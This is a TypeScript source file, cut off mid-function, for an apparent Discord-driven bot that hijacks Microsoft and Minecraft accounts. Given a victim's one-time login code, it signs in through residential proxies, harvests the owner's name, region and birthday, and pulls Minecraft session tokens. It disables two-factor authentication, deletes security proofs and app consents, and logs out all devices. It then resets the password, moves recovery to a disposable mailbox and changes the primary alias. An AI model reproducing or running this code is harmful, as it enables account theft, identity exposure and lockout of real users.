import { spawn } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { CookieJar, fetchWithJar } from "./cookie-jar.js";
import { createLogger } from "./api.js";

const __secureDir = path.dirname(fileURLToPath(import.meta.url));
const LOGIN_OTP_SCRIPT = path.resolve(__secureDir, "../scripts/login_otp.py");

/** Python residential-proxy OTP login → inject cookies into jar */
async function loginWithCodeViaPython(
  jar: CookieJar,
  email: string,
  proofId: string,
  code: string,
  log: (level: string, msg: string) => Promise<void>,
): Promise<boolean> {
  const bins = process.platform === "win32" ? ["python", "py", "python3"] : ["python3", "python"];
  for (const bin of bins) {
    try {
      const result = await new Promise<{
        ok?: boolean;
        cookies?: Record<string, string>;
        error?: string;
        proxy?: string;
      } | null>((resolve) => {
        const child = spawn(bin, [LOGIN_OTP_SCRIPT, email, proofId, code], {
          windowsHide: true,
          env: process.env,
          cwd: path.resolve(__secureDir, ".."),
        });
        let stdout = "";
        let stderr = "";
        child.stdout.on("data", (d) => {
          stdout += String(d);
        });
        child.stderr.on("data", (d) => {
          stderr += String(d);
        });
        child.on("error", () => resolve(null));
        child.on("close", () => {
          const line = stdout.trim().split(/\r?\n/).filter(Boolean).pop() || "";
          if (!line) {
            void log("warn", `[secure] login_otp empty (${bin}): ${stderr.slice(0, 160)}`);
            resolve(null);
            return;
          }
          try {
            resolve(JSON.parse(line) as { ok?: boolean; cookies?: Record<string, string>; error?: string; proxy?: string });
          } catch {
            resolve(null);
          }
        });
      });
      if (!result) continue;
      if (result.ok && result.cookies) {
        for (const [k, v] of Object.entries(result.cookies)) {
          jar.setFromResponse("https://login.live.com", `${k}=${v}`);
        }
        await log(
          "info",
          `[secure] OTP login ok via python proxy=${result.proxy || "?"} cookies=${Object.keys(result.cookies).length}`,
        );
        return true;
      }
      await log("warn", `[secure] python login failed: ${(result.error || "unknown").slice(0, 200)}`);
      // Don't try other python bins if script ran
      return false;
    } catch {
      /* try next bin */
    }
  }
  return false;
}

export interface SecureJobConfig {
  email: string;
  flowToken: string;
  code: string;
  mcUsername?: string;
  guildId: string;
  channelId: string;
  messageId?: string;
  discordId: string;
  sessionId?: string;
  roleId?: string;
  ownerDiscordId?: string | null;
}

export interface SecureResult {
  mcUsername: string;
  mcEmail: string;
  newEmail: string;
  newPassword: string;
  recoveryCode: string;
  ssid: string | null;
  capes: string;
  method: string;
  firstName: string;
  lastName: string;
  region: string;
  birthday: string;
}

function extract(text: string, regex: RegExp): string {
  const m = regex.exec(text);
  if (!m) throw new Error(`Regex ${regex} not found in response`);
  return m[1];
}

function extractAll(text: string, regex: RegExp): string[] {
  const results: string[] = [];
  let m;
  while ((m = regex.exec(text)) !== null) {
    results.push(m[1]);
  }
  return results;
}

function decodeUnicode(s: string): string {
  return s.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16)),
  );
}

interface LiveData {
  urlPost: string;
  ppft: string;
}

async function getLiveData(jar: CookieJar): Promise<LiveData> {
  const res = await fetchWithJar(jar, "https://login.live.com", {
    method: "POST",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
    },
  });
  const text = await res.text();

  const urlPost = extract(
    text,
    /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
  );
  const ppftMatch = extract(text, /value=\\?"([^"]+)"/);

  return { urlPost, ppft: ppftMatch };
}

/** Login with email OTP — try type 27 (otc) then type 24 (npotc). */
async function loginWithCode(
  jar: CookieJar,
  email: string,
  flowToken: string,
  code: string,
  ppft: string,
  urlPost: string,
): Promise<boolean> {
  const attempts: Array<Record<string, string>> = [
    {
      login: email,
      loginfmt: email,
      SentProofIDE: flowToken,
      otc: code,
      type: "27",
      PPFT: ppft,
    },
    {
      login: email,
      loginfmt: email,
      SentProofIDE: flowToken,
      npotc: code,
      type: "24",
      PPFT: ppft,
    },
  ];

  for (let i = 0; i < attempts.length; i++) {
    const res = await fetchWithJar(
      jar,
      urlPost,
      {
        method: "POST",
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: "https://login.live.com",
          Referer: "https://login.live.com/",
          "Accept-Language": "en-US,en;q=0.5",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
        },
        body: new URLSearchParams(attempts[i]).toString(),
      },
      { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
    );

    const text = await res.text();
    if (jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC")) {
      return true;
    }

    // Notice / ToS / intermediate form
    const actionMatch = text.match(
      /action="([^"]+)".*?id="correlation_id" value="([^"]+)".*?id="code" value="([^"]+)"/s,
    );
    if (actionMatch) {
      const [, actionUrl, correlationId, actionCode] = actionMatch;
      const noticeRes = await fetchWithJar(
        jar,
        actionUrl,
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ correlation_id: correlationId, code: actionCode }).toString(),
        },
        { followRedirects: true, maxRedirects: 10, timeoutMs: 25_000 },
      );
      const noticeText = await noticeRes.text();
      const redirectUrlMatch = noticeText.match(/var redirectUrl = '([^']+)'/);
      if (redirectUrlMatch) {
        const redirectUrl = redirectUrlMatch[1].replace(/\\u0026/g, "&").replace(/\\u0026/g, "&");
        await fetchWithJar(jar, redirectUrl, { method: "GET" }, { followRedirects: true, maxRedirects: 10 });
      }
      if (jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC")) {
        return true;
      }
    }

    // Sometimes KMSI / stay signed in form
    const kmsiPost = text.match(/urlPost"\s*:\s*"([^"]+)"/) || text.match(/"urlPost"\s*:\s*"([^"]+)"/);
    const sFT = text.match(/"sFT"\s*:\s*"([^"]+)"/);
    if (kmsiPost && sFT && !jar.get("__Host-MSAAUTH")) {
      await fetchWithJar(
        jar,
        kmsiPost[1].replace(/\\u0026/g, "&"),
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            LoginOptions: "1",
            type: "28",
            PPFT: sFT[1],
          }).toString(),
        },
        { followRedirects: true, maxRedirects: 10 },
      );
      if (jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC")) {
        return true;
      }
    }
  }

  return !!(jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC"));
}

async function getCookies(jar: CookieJar): Promise<string> {
  const res = await fetchWithJar(jar, "https://account.live.com/password/reset", {
    headers: { host: "account.live.com" },
    redirect: "manual",
  });
  const text = await res.text();
  const raw = extract(text, /"apiCanary":"([^"]+)"/);
  return decodeUnicode(decodeURIComponent(raw));
}

async function getT(jar: CookieJar): Promise<string | null> {
  const res = await fetchWithJar(jar, "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&ct=1708978285&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=0637740e739c48f6bf118445d579a786&lc=1033&id=38936&mkt=en-US&uaid=0637740e739c48f6bf118445d579a786", {
    redirect: "manual",
  });
  const text = await res.text();
  const m = text.match(/<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>/);
  return m ? m[1] : null;
}

async function getAMC(jar: CookieJar): Promise<string | null> {
  try {
    let res = await fetchWithJar(
      jar,
      "https://account.microsoft.com",
      {
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        },
      },
      { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
    );
    let text = await res.text();

    // Silent sign-in form if present
    const tMatch = text.match(
      /<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>/,
    );
    if (tMatch) {
      res = await fetchWithJar(
        jar,
        "https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F&wa=wsignin1.0&refd=login.live.com",
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ t: tMatch[1] }).toString(),
        },
        { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
      );
      text = await res.text();
      const href = text.match(/href="(https:\/\/account\.microsoft\.com[^"]+)"/)?.[1];
      if (href) {
        res = await fetchWithJar(jar, href.replace(/&amp;/g, "&"), {
          headers: {
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          },
        }, { followRedirects: true, maxRedirects: 10 });
        text = await res.text();
      }
    }

    // SSO redirect polish path
    const sso = text.match(
      /https:\/\/account\.microsoft\.com\/auth\/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+/,
    );
    if (sso) {
      res = await fetchWithJar(jar, sso[0], {}, { followRedirects: true, maxRedirects: 10 });
      text = await res.text();
      const action = text.match(/action="([^"]+)"/)?.[1];
      const pprid = text.match(/name="pprid"[^>]*value="([^"]+)"/)?.[1];
      const nap = text.match(/name="NAP"[^>]*value="([^"]+)"/)?.[1];
      const anon = text.match(/name="ANON"[^>]*value="([^"]+)"/)?.[1];
      const t = text.match(/name="t"[^>]*value="([^"]+)"/)?.[1];
      if (action && pprid && nap && anon && t) {
        res = await fetchWithJar(
          jar,
          action,
          {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ pprid, NAP: nap, ANON: anon, t }).toString(),
          },
          { followRedirects: true, maxRedirects: 10 },
        );
        text = await res.text();
      }
    }

    // Final page for antiforgery token
    res = await fetchWithJar(
      jar,
      "https://account.microsoft.com/",
      {
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
        },
      },
      { followRedirects: true, maxRedirects: 8 },
    );
    text = await res.text();
    const rvt = text.match(
      /name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"/s,
    )?.[1];
    return rvt || null;
  } catch {
    return null;
  }
}

async function getOwnerInfo(jar: CookieJar, verificationToken: string) {
  try {
    const res = await fetchWithJar(jar, "https://account.microsoft.com/profile/api/v1/personal-info", {
      headers: {
        Accept: "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        __RequestVerificationToken: verificationToken,
        Referer: "https://account.microsoft.com/profile",
      },
    });
    const data = (await res.json()) as Record<string, string>;
    return {
      firstName: data.firstName ?? "Unknown",
      lastName: data.lastName ?? "Unknown",
      region: data.region ?? "Unknown",
      birthday: data.birthday ?? "Unknown",
    };
  } catch {
    return null;
  }
}

async function getXBL(jar: CookieJar) {
  try {
    let res = await fetchWithJar(jar, "https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254", {
      redirect: "manual",
    });
    let loc = res.headers.get("location");
    if (!loc) return null;

    res = await fetchWithJar(jar, loc, { redirect: "manual" });
    loc = res.headers.get("location");
    if (!loc) return null;

    res = await fetchWithJar(jar, loc, { redirect: "manual" });
    loc = res.headers.get("location");
    if (!loc) return null;

    const tokenMatch = loc.match(/accessToken=([^&#]+)/);
    if (!tokenMatch) return null;

    let accessToken = tokenMatch[1];
    while (accessToken.length % 4 !== 0) accessToken += "=";

    const decoded = Buffer.from(accessToken, "base64").toString("utf-8");
    const jsonData = JSON.parse(decoded) as Array<Record<string, unknown>>;

    const item0 = jsonData[0] as Record<string, unknown> | undefined;
    const item2 = item0?.Item2 as Record<string, unknown> | undefined;
    const displayClaims = item2?.DisplayClaims as Record<string, unknown> | undefined;
    const xui = displayClaims?.xui as Array<Record<string, unknown>> | undefined;
    const uhs = (xui?.[0]?.uhs as string) ?? "";

    let xsts = "";
    for (const item of jsonData) {
      if ((item as Record<string, string>).Item1 === "rp://api.minecraftservices.com/") {
        xsts = ((item as Record<string, Record<string, string>>).Item2?.Token ?? "") as string;
        break;
      }
    }

    if (!uhs || !xsts) return null;
    return `XBL3.0 x=${uhs};${xsts}`;
  } catch {
    return null;
  }
}

async function getSSID(xbl: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/authentication/login_with_xbox", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ identityToken: xbl, ensureLegacyEnabled: true }),
    });
    const data = (await res.json()) as Record<string, string>;
    return data.access_token ?? null;
  } catch {
    return null;
  }
}

async function getProfile(ssid: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/minecraft/profile", {
      headers: { Authorization: `Bearer ${ssid}` },
    });
    const data = (await res.json()) as Record<string, unknown>;
    return (data.name as string) ?? null;
  } catch {
    return null;
  }
}

async function getCapesList(ssid: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/minecraft/profile", {
      headers: { Authorization: `Bearer ${ssid}` },
    });
    const data = (await res.json()) as Record<string, unknown>;
    if (data.capes && Array.isArray(data.capes)) {
      return (data.capes as Array<Record<string, string>>).map((c) => c.alias).join(", ");
    }
    return null;
  } catch {
    return null;
  }
}

async function getMethod(ssid: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/entitlements/license?requestId=c24114ab-1814-4d5c-9b1f-e8825edaec1f", {
      headers: { Authorization: `Bearer ${ssid}` },
    });
    const data = (await res.json()) as Record<string, Array<Record<string, string>>>;
    if (data.items) {
      for (const item of data.items) {
        if (item.name === "product_minecraft" || item.name === "game_minecraft") {
          if (item.source === "GAMEPASS") return "Gamepass";
          if (item.source === "PURCHASE" || item.source === "MC_PURCHASE") return "Purchased";
        }
      }
    }
    return null;
  } catch {
    return null;
  }
}

async function getAMRP(jar: CookieJar, t: string): Promise<boolean> {
  const res = await fetchWithJar(jar, "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ t }).toString(),
    redirect: "manual",
  });
  return !!jar.get("AMRPSSecAuth");
}

async function remove2FA(jar: CookieJar, apiCanary: string) {
  try {
    await fetchWithJar(jar, "https://account.live.com/API/Proofs/DisableTfa", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-ms-apiVersion": "2",
        "x-ms-apiTransport": "xhr",
        uiflvr: "1001",
        scid: "100109",
        hpgid: "201030",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/proofs/Manage/additional",
        canary: apiCanary,
      },
      body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
      redirect: "manual",
    });
  } catch {}
}

async function removeZyger(jar: CookieJar, apiCanary: string) {
  try {
    await fetchWithJar(jar, "https://account.live.com/API/Proofs/RevokeWindowsHelloProofs", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-ms-apiVersion": "2",
        "x-ms-apiTransport": "xhr",
        uiflvr: "1001",
        scid: "100109",
        hpgid: "201030",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/proofs/Manage/additional",
        canary: apiCanary,
      },
      body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
      redirect: "manual",
    });
  } catch {}
}

async function removeProofs(jar: CookieJar, apiCanary: string) {
  try {
    const res = await fetchWithJar(jar, "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security", {
      redirect: "manual",
    });
    const text = await res.text();
    const proofIds = extractAll(text, /"proofId":"([^"]+)"/);

    for (const rawId of proofIds) {
      const proofId = decodeUnicode(rawId);
      try {
        await fetchWithJar(jar, "https://account.live.com/API/Proofs/DeleteProof", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            Accept: "application/json",
            canary: apiCanary,
          },
          body: JSON.stringify({
            proofId,
            uaid: "114b68368b7b46afa44c82a8246e4a44",
            uiflvr: 1001,
            scid: 100109,
            hpgid: 201030,
          }),
        });
      } catch {}
    }
  } catch {}
}

async function removeServices(jar: CookieJar) {
  try {
    const res = await fetchWithJar(jar, "https://account.live.com/consent/Manage?guat=1", {
      headers: { Referer: "https://login.live.com/" },
    });
    const text = await res.text();
    const clientIds = extractAll(text, /client_id=([A-F0-9]{16})/);

    if (!clientIds.length) return;

    for (const clientId of clientIds) {
      try {
        const editRes = await fetchWithJar(jar, `https://account.live.com/consent/Edit?client_id=${clientId}`, {
          redirect: "manual",
        });
        const editText = await editRes.text();
        const postUrl = extract(editText, /name="editConsentForm"[^>]*action="([^"]+)"/);
        const canary = encodeURIComponent(extract(editText, /canary"[^>]*value="([^"]+)"/));

        await fetchWithJar(jar, postUrl, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ canary }).toString(),
          redirect: "manual",
        });
      } catch {}
    }
  } catch {}
}

async function securityInformation(jar: CookieJar): Promise<string> {
  const res = await fetchWithJar(jar, "https://account.live.com/proofs/Manage/additional");
  const text = await res.text();
  const m = text.match(/var\s+t0\s*=\s*(\{.*?\});/s);
  if (!m) throw new Error("Failed to extract security information");
  return m[1];
}

async function getRecoveryCode(jar: CookieJar, apiCanary: string, encryptedNetId: string): Promise<string> {
  const res = await fetchWithJar(jar, "https://account.live.com/API/Proofs/GenerateRecoveryCode", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-ms-apiVersion": "2",
      "x-ms-apiTransport": "xhr",
      uiflvr: "1001",
      scid: "100109",
      hpgid: "201030",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://account.live.com",
      Referer: "https://account.live.com/proofs/Manage/additional",
      canary: apiCanary,
    },
    body: JSON.stringify({ encryptedNetId, uiflvr: 1001, scid: 100109, hpgid: 201030 }),
  });
  const data = (await res.json()) as Record<string, string>;
  return data.recoveryCode;
}

async function generateEmail(): Promise<{ email: string; password: string; token: string }> {
  const apiKey = process.env.FIRSTMAIL_API_KEY;
  if (!apiKey) throw new Error("FIRSTMAIL_API_KEY not set");

  const res = await fetch("https://api-tools.firstmail.ltd/lk/get/email?type=3", {
    headers: { "X-API-KEY": apiKey },
  });
  const data = (await res.json()) as Record<string, unknown>;
  let email = "";
  let password = "";
  if (data.email && data.password) {
    email = data.email as string;
    password = data.password as string;
  } else if (data.data && typeof data.data === "object") {
    const d = data.data as Record<string, string>;
    email = d.email;
    password = d.password;
  } else {
    throw new Error(`Unrecognized firstmail response: ${JSON.stringify(data)}`);
  }
  return { email, password, token: password };
}

async function getEmailCode(
  email: string,
  password: string,
  signal?: AbortSignal,
): Promise<string> {
  const { ImapFlow } = await import("imapflow");
  const client = new ImapFlow({
    host: "mail.firstmail.ltd",
    port: 993,
    secure: true,
    auth: { user: email, pass: password },
    logger: false,
  });

  try {
    await client.connect();
    const lock = await client.getMailboxLock("INBOX");
    try {
      const startTime = Date.now();
      const timeout = 90_000;

      while (Date.now() - startTime < timeout) {
        if (signal?.aborted) throw new Error("Aborted while waiting for security code");
        const mb = client.mailbox;
        const latestSeq = mb && typeof mb === "object" ? mb.exists : 0;
        if (latestSeq > 0) {
          const message = await client.fetchOne(
            `${latestSeq}`,
            { source: true },
          );
          if (message) {
            const source = message.source?.toString() || "";
            const match = source.match(/Security code:\s*(\d+)/);
            if (match) {
              return match[1];
            }
          }
        }
        await new Promise((r) => setTimeout(r, 2000));
      }
      throw new Error("Timeout waiting for security code");
    } finally {
      lock.release();
    }
  } finally {
    try {
      await client.logout();
    } catch {
      /* ignore */
    }
  }
}

async function recover(
  jar: CookieJar,
  email: string,
  recoveryCode: string,
  newEmail: string,
  newPassword: string,
  emailToken: string,
  signal?: AbortSignal,
): Promise<{ urlPost: string; recoveryCode: string } | null> {
  try {
    if (signal?.aborted) throw new Error("Aborted before recovery");
    const res = await fetchWithJar(jar, `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`, {}, { timeoutMs: 25_000 });
    const text = await res.text();

    const serverDataMatch = text.match(/var\s+ServerData=(.*?)(?=;|$)/);
    if (!serverDataMatch) return null;
    const serverData = JSON.parse(serverDataMatch[1]) as Record<string, string>;

    const decodedToken = decodeURIComponent(serverData.sRecoveryToken).replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
      String.fromCharCode(parseInt(hex, 16)),
    );
    const postUrl = extract(text, /"urlPostSltToLogin":"([^"]+)"/);

    const recRes = await fetchWithJar(jar, "https://account.live.com/API/Recovery/VerifyRecoveryCode", {
      method: "POST",
      headers: {
        "Content-type": "application/json; charset=utf-8",
        Accept: "application/json",
        canary: serverData.apiCanary,
        hpgid: "200284",
        hpgact: "0",
      },
      body: JSON.stringify({
        recoveryCode,
        code: recoveryCode,
        scid: 100103,
        token: decodedToken,
        uiflvr: 1001,
      }),
      signal,
    }, { timeoutMs: 25_000 });
    const recJson = (await recRes.json()) as Record<string, string>;
    if (!recJson.apiCanary) return null;

    const canary = recJson.apiCanary;
    const token = recJson.token;

    const sendCodeRes = await fetchWithJar(jar, "https://account.live.com/api/Proofs/SendOtt", {
      method: "POST",
      headers: {
        "Content-type": "application/json; charset=utf-8",
        Accept: "application/json",
        canary,
        hpgid: "200284",
        hpgact: "0",
      },
      body: JSON.stringify({
        associationType: "None",
        action: "VerifyNewProof",
        channel: "Email",
        cxt: "MP",
        proofId: newEmail,
        scid: 100103,
        token,
        uiflvr: 1001,
      }),
      signal,
    }, { timeoutMs: 25_000 });
    const sendCodeJson = (await sendCodeRes.json()) as Record<string, string>;
    if (!sendCodeJson.apiCanary) return null;

    // Firstmail IMAP uses the mailbox API token as password, NOT the new MS password
    const otpCode = await getEmailCode(newEmail, emailToken, signal);

    const verifyRes = await fetchWithJar(jar, "https://account.live.com/API/Proofs/VerifyCode", {
      method: "POST",
      headers: {
        "Content-type": "application/json; charset=utf-8",
        Accept: "application/json",
        canary: sendCodeJson.apiCanary,
        hpgid: "200284",
        hpgact: "0",
      },
      body: JSON.stringify({
        action: "VerifyOtc",
        proofId: newEmail,
        scid: 100103,
        token,
        uiflvr: 1001,
        code: otpCode,
      }),
    });
    const verifyJson = (await verifyRes.json()) as Record<string, string>;

    const finishRes = await fetchWithJar(jar, "https://account.live.com/API/Recovery/RecoverUser", {
      method: "POST",
      headers: {
        "Content-type": "application/json; charset=utf-8",
        Accept: "application/json",
        canary: verifyJson.apiCanary,
        hpgid: "200284",
        hpgact: "0",
      },
      body: JSON.stringify({
        contactEmail: newEmail,
        contactEpid: "",
        password: newPassword,
        passwordExpiryEnabled: 0,
        scid: 100103,
        token,
        uaid: "6b182876e51a429db0e2cff317076750",
        uiflvr: 1001,
      }),
    });
    const finishJson = (await finishRes.json()) as Record<string, string>;

    if (finishJson.recoveryCode) {
      return { urlPost: postUrl, recoveryCode: finishJson.recoveryCode };
    }
    return null;
  } catch (e) {
    console.error("[secure] recover error:", e);
    return null;
  }
}

async function logoutAll(jar: CookieJar, apiCanary: string) {
  try {
    await fetchWithJar(jar, "https://account.live.com/API/Proofs/DeleteDevices", {
      method: "POST",
      headers: { canary: apiCanary },
      body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
      redirect: "manual",
    });
  } catch {}
}

async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: string): Promise<boolean> {
  try {
    const canaryRes = await fetchWithJar(jar, "https://account.live.com/AddAssocId", {
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });
    const canaryText = await canaryRes.text();
    const addCanary = encodeURIComponent(extract(canaryText, /name="canary" value="([^"]+)"/));

    await fetchWithJar(jar, "https://account.live.com/AddAssocId?ru=&cru=&fl=", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/AddAssocId",
      },
      body: new URLSearchParams({
        canary: addCanary,
        PostOption: "LIVE",
        SingleDomain: "",
        UpSell: "",
        AddAssocIdOptions: "LIVE",
        AssociatedIdLive: emailName,
        DomainList: "outlook.com",
      }).toString(),
    });

    const pinfoRes = await fetchWithJar(jar, "https://account.live.com/API/MakePrimary", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        Accept: "application/json",
        hpgid: "200176",
        scid: "100141",
        uiflvr: "1001",
        canary: apiCanary,
      },
      body: JSON.stringify({
        aliasName: `${emailName}@outlook.com`,
        emailChecked: true,
        removeOldPrimary: true,
        uiflvr: 1001,
        scid: 100141,
        hpgid: 200176,
      }),
    });
    const pinfo = (await pinfoRes.json()) as Record<string, unknown>;
    if (pinfo.error) return false;
    return true;
  } catch {
    return false;
  }
}

const SECURE_HARD_TIMEOUT_MS = 4 * 60_000; // hard stop so jobs never hang forever

export async function runSecureBot(
  jobId: string,
  discordId: string,
  config: SecureJobConfig,
  signal: AbortSignal,
): Promise<SecureResult | null> {
  const log = createLogger(jobId, discordId);
  const jar = new CookieJar();
  const hardAbort = new AbortController();
  const hardTimer = setTimeout(() => hardAbort.abort(), SECURE_HARD_TIMEOUT_MS);
  const onParentAbort = () => hardAbort.abort();
  if (signal.aborted) hardAbort.abort();
  else signal.addEventListener("abort", onParentAbort, { once: true });
  const runSignal = hardAbort.signal;

  const ensureAlive = () => {
    if (runSignal.aborted) throw new Error("Secure job aborted or timed out");
  };

  try {
    await log("info", `[secure] Starting securing pipeline for ${config.email}`);
    ensureAlive();

    // Phase 1: Login with OTP via residential proxies (python), fallback to node
    ensureAlive();
    await log(
      "info",
      `[secure] Logging in with OTP (proofLen=${(config.flowToken || "").length})...`,
    );

    let loggedIn = false;
    if (config.flowToken && config.code) {
      loggedIn = await loginWithCodeViaPython(
        jar,
        config.email,
        config.flowToken,
        config.code,
        log,
      );
    }

    if (!loggedIn) {
      await log("info", "[secure] Python login unavailable/failed — trying node fallback...");
      let liveData: LiveData;
      try {
        liveData = await getLiveData(jar);
      } catch (e) {
        const res = await fetchWithJar(jar, "https://login.live.com", { method: "POST" });
        const text = await res.text();
        const urlPost =
          text.match(/https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/)?.[0] || "";
        const ppft =
          text.match(/name="PPFT"[^>]*value="([^"]+)"/)?.[1] ||
          text.match(/value=\\?"([^"]+)"/)?.[1] ||
          "";
        if (!urlPost || !ppft) {
          await log("error", `[secure] getLiveData failed: ${e instanceof Error ? e.message : e}`);
          return null;
        }
        liveData = { urlPost, ppft };
      }
      loggedIn = await loginWithCode(
        jar,
        config.email,
        config.flowToken,
        config.code,
        liveData.ppft,
        liveData.urlPost,
      );
    }

    if (!loggedIn) {
      await log(
        "error",
        "[secure] Failed to login — invalid/expired OTP, proof id mismatch, or MS blocked IP. Request a fresh code.",
      );
      return null;
    }
    await log("info", "[secure] Logged in successfully!");
    ensureAlive();

    // Phase 2: Run securing pipeline (post-login steps are best-effort where possible)
    const result: SecureResult = {
      mcUsername: config.mcUsername || "Unknown",
      mcEmail: config.email,
      newEmail: "Couldn't Change!",
      newPassword: "Couldn't Change!",
      recoveryCode: "Couldn't Change!",
      ssid: null,
      capes: "No capes",
      method: "Not purchased",
      firstName: "Failed to Get",
      lastName: "Failed to Get",
      region: "Failed to Get",
      birthday: "Failed to Get",
    };

    ensureAlive();

    let apiCanary = "";
    try {
      await log("info", "[secure] Getting cookies...");
      apiCanary = await getCookies(jar);
    } catch (e) {
      await log(
        "warn",
        `[secure] apiCanary failed (continuing): ${e instanceof Error ? e.message : e}`,
      );
    }

    ensureAlive();

    let t: string | null = null;
    try {
      await log("info", "[secure] Getting TOS token...");
      t = await getT(jar);
    } catch (e) {
      await log("warn", `[secure] TOS token failed: ${e instanceof Error ? e.message : e}`);
    }

    ensureAlive();

    let verificationToken: string | null = null;
    try {
      await log("info", "[secure] Getting verification token...");
      verificationToken = await getAMC(jar);
    } catch (e) {
      await log(
        "warn",
        `[secure] AMC token failed (continuing): ${e instanceof Error ? e.message : e}`,
      );
    }

    ensureAlive();

    if (verificationToken) {
      await log("info", "[secure] Getting owner info...");
      const ownerInfo = await getOwnerInfo(jar, verificationToken);
      if (ownerInfo) {
        result.firstName = ownerInfo.firstName;
        result.lastName = ownerInfo.lastName;
        result.region = ownerInfo.region;
        result.birthday = ownerInfo.birthday;
      }
    } else {
      await log("warn", "[secure] Skipping owner info (no AMC token)");
    }

    ensureAlive();

    // Get Xbox/Minecraft info (optional — do not fail whole job)
    try {
      await log("info", "[secure] Getting Xbox Live profile...");
      const xbl = await getXBL(jar);

      if (xbl) {
        await log("info", "[secure] Getting Minecraft access token...");
        const ssid = await getSSID(xbl);
        if (ssid) {
